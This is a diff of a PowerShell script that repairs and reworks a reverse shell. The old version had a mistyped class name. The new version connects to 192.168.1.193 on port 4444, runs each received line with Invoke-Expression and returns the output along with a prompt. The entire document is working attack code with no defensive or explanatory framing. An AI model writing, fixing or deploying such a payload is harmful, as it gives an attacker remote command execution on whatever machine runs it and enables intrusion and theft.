@@ -1,12 +1,24 @@
-$client = New-Object System.Net.Sockets.TTCPClient("192.168.1.193", 4444); 
-$stream = $client.GetStream(); 
-[byte[]]$bytes = 0..65535|%{0}; 
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); 
-    $sendback = (iex $data 2>&1 | Out-String ); 
-    $sendback2 = $sendback + "PS " + (pwd).Path + "> "; 
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
-    $stream.Write($sendbyte, 0, $sendbyte.Length); 
-    $stream.Flush() 
+$client = New-Object System.Net.Sockets.TcpClient("192.168.1.193", 4444);
+$stream = $client.GetStream();
+$writer = New-Object System.IO.StreamWriter($stream);
+$reader = New-Object System.IO.StreamReader($stream);
+$writer.AutoFlush = $true;
+
+try {
+    $writer.WriteLine("Connected to reverse shell.")
+    while ($client.Connected) {
+        $data = $reader.ReadLine();
+        if ($data -eq "exit") { break }
+        try {
+            $sendback = iex $data 2>&1 | Out-String;
+            $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+            $writer.WriteLine($sendback2);
+        } catch {
+            $writer.WriteLine("Error: $_");
+        }
+    }
+} catch {
+    $writer.WriteLine("Disconnected")
+} finally {
+    $client.Close();
 }
-$client.Close()
